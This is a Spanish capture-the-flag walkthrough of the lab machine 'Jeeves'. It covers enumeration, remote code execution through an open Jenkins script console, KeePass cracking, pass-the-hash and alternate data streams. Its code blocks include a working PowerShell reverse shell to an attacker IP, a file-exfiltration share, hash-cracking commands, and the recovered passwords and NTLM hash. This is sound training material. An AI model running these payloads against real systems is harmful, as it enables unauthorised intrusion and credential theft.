# Jeeves

![](../../../../~gitbook/image.md)Publicado: 11 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Jeeves es una máquina Windows de dificultad media que presenta múltiples vectores de ataque interesantes. La máquina ejecuta un servidor web IIS en el puerto 80 con una aplicación de búsqueda vulnerable, y un servidor Jetty en el puerto 50000 que expone una consola de Jenkins. El vector principal de acceso inicial se obtiene a través de la explotación de la consola de scripts de Jenkins, que permite la ejecución remota de código. Para la escalada de privilegios, se requiere el análisis de un archivo KeePass encontrado en el sistema, cuya contraseña se puede crackear offline, revelando credenciales que incluyen un hash NTLM del administrador. La escalada final se logra mediante un ataque de Pass-the-Hash, y la flag final está oculta en un flujo de datos alternativo (ADS) del sistema de archivos NTFS.
###🔭 Reconocimiento

####Ping para verificación en base a TTL

####Enumeración de servicios

###🔐 Servicios Encontrados

####🗂️ 445 TCP - SMB
Verificamos si podemos enumerar algo de información mediante una NULL Session pero no parece posible:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
###🌐 Enumeración Web

####🌍 Puerto 80 - HTTP (IIS)
Al acceder al servicio expuesto en el puerto 80 en http://10.10.10.63/ encontramos una aplicación llamada Jeeves que parece ser un Buscador:![](../../../../~gitbook/image.md)Probamos la funcionalidad de búsqueda y recibimos un mensaje de error de base de datos que nos revela información valiosa:- Base de datos: Microsoft SQL Server 2005 9.00.4053
- Directorio revelado en el mensaje de error
![](../../../../~gitbook/image.md)En el mensaje vemos un directorio:![](../../../../~gitbook/image.md)Realizamos fuzzing de directorios pero no encontramos nada de utilidad que podamos usar como vector de ataque.
####🚀 Puerto 50000 - HTTP (Jetty)
Al acceder a este servicio en [http://10.10.10.63:50000/](http://10.10.10.63:50000/) encontramos:- Error 404 Not Found
- Banner: Jetty 9.4.z-SNAPSHOT (versión en desarrollo)
![](../../../../~gitbook/image.md)🔍 Fuzzing de directoriosAl realizar fuzzing de directorios usando gobuster encontramos un recurso crítico:Recurso encontrado: `/askjeeves`![](../../../../~gitbook/image.md)Recurso encontrado: `/askjeeves`
###💥 Explotación - Acceso Inicial

####🎯 Jenkins Script Console
Accedemos al recurso [http://10.10.10.63:50000/askjeeves](http://10.10.10.63:50000/askjeeves) y descubrimos que tenemos acceso al Script Console de Jenkins sin autenticación:![](../../../../~gitbook/image.md)🧪 Prueba de Concepto (PoC)Relizamos una PoC ejecutando el siguiente código para ver si logramos enumerar el usuario de la máquina:Resultado: Usuario `kohsuke` confirmado![](../../../../~gitbook/image.md)Ahora iniciamos un listener en nuestro host de ataque:
####🔄 Reverse Shell
A continuación, tratamos de explotar una RCE y ganar acceso a la maquina usando el siguiente payload:Y obtenemos la reverse shell en la máquina windows:![](../../../../~gitbook/image.md)Enumeramos la máquina y obtenemos la primera flag en el directorio Desktop del usuario kohsuke:![](../../../../~gitbook/image.md)
###### 🔝 Escalada de Privilegios

####🔑 Descubrimiento de KeePass
Continuamos enumerando y descubrimos un archivo de keepass en el directorio Documents del usuario kohsuke:![](../../../../~gitbook/image.md)Podemos transferir este archivo a nuestro host de ataque usando por ejemplo smbserver de impacket para montar un recurso en red de la siguiente forma:![](../../../../~gitbook/image.md)
####🔓 Análisis del Archivo KeePass
Una vez transferido el archivo a nuestro host de ataque, verificamos con el comando file el tipo de archivo:Vemos que se trta de un archivo de keepass de versión 2.xIntentamos usar kepass2john para extraer el hash del archivo y ver si podemos crackearlo offline mediante un ataque de diccionario![](../../../../~gitbook/image.md)Copiamos el hash con el formato correcto y sin saltos de línea:A continuación, usamos hashcat y el diccionario rockyou para crackearlo y obtener la contraseña:![](../../../../~gitbook/image.md)
####🗝️ Acceso a KeePass
Ahora usamos la herramienta keepass2 para cargar el archivo CEH.kdbx y usar la contraseña maestra que hemos obtenido anteriormente con hashcat:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Recopilamos todas las contraseñas y el hash que hemos encontrado para ver si alguna se está reutilizando por el usuario Administrator:
####📋 Credenciales Encontradas
Contraseñas recopiladas:Hash NTLM encontrado:No hay suerte tratando de autenticarnos con ellas y el usuario administrator contra el servicio SMB:![](../../../../~gitbook/image.md)
####🎯 Pass-the-Hash Attack
Sin embargo, usamos impacket-psexec para hacer pass the hash usando la cuenta del usuario Administrator y el hash encontrado y logramos ganar acceso como administrador:![](../../../../~gitbook/image.md)
###🏆 Flag Root - Flujos de Datos Alternativos (ADS)

####🔍 Búsqueda Inicial
Al acceder al directorio Desktop del Administrator, encontramos una pista en lugar de la flag:
Accedemos al directorio Desktop del usuario Administrator para obtener la flag, sin embargo, encontramos un fichero de texto que nos indica que tenemos que buscar de forma más profunda:![](../../../../~gitbook/image.md)Tras buscar el archivo root.txt en toda la raíz de windows usandoNo encontramos nada. Cambiamos el enfoque, hay una característica del sistema de archivos NTFS que son los flujos de datos alternativos (ADS)
####📁 Detección de ADS
Usamos `dir /R` para mostrar los flujos de datos alternativos:
Con el comando `dir /R` en Windows muestra información detallada sobre los archivos de un directorio, incluyendo sus flujos de datos alternativos (ADS):![](../../../../~gitbook/image.md)Podemos usar el comando more para leer el contenido de la siguiente forma:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🔐 Servicios Encontrados](#servicios-encontrados)
- [🌐 Enumeración Web](#enumeracion-web)
- [💥 Explotación - Acceso Inicial](#explotacion-acceso-inicial)
- [🏆 Flag Root - Flujos de Datos Alternativos (ADS)](#flag-root-flujos-de-datos-alternativos-a-ds)

```
❯  ping -c2 10.10.10.63
PING 10.10.10.63 (10.10.10.63) 56(84) bytes of data.
64 bytes from 10.10.10.63: icmp_seq=1 ttl=127 time=45.6 ms
64 bytes from 10.10.10.63: icmp_seq=2 ttl=127 time=41.4 ms

--- 10.10.10.63 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 41.373/43.482/45.591/2.109 ms```

> 💡 **Nota**: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.

### Escaneo de puertos

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.63 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
80,135,445,50000
```

```
nmap -sC -sV -p$ports 10.10.10.63 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 19:35 CEST
Nmap scan report for 10.10.10.63
Host is up (0.042s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-06-11T22:35:15
|_  start_date: 2025-06-11T22:25:19
|_clock-skew: mean: 5h00m02s, deviation: 0s, median: 5h00m01s

```

```
gobuster dir -e --url http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80
```

```
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```
nc -nlvp 443
```

```
def host = "10.10.14.7"
def port = "443"

def cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$host',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""

def proc = Runtime.getRuntime().exec(cmd)
proc.waitFor()
```

```
impacket-smbserver smbShare $(pwd) -smb2support -username x3m1Sec -password x3m1Sec123
```

```
net use z: \\10.10.14.7\smbShare /user:x3m1Sec x3m1Sec123
```

```
copy CEH.kdbx z:\
```

```
file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX
```

```
keepass2john CEH.kdbx  > passcodes.txt
```

```
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

```
hashcat -m 13400 -a 0 passcodes.txt /usr/share/wordlists/rockyou.txt
```

```
keepass2 CEH.kdbx
```

```
S1TjAtJHKsugh9oC4VZl
Password
12345
F7WhTrSFDKB6sxHU1cUn
pwndyouall!
lCEUnYPjNfIuPZSzOySA
```

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00  administrator@10.10.10.63
```

```
dir C:\root.txt /s /p

dir C:\root /s /p /a:-d
```

```
more
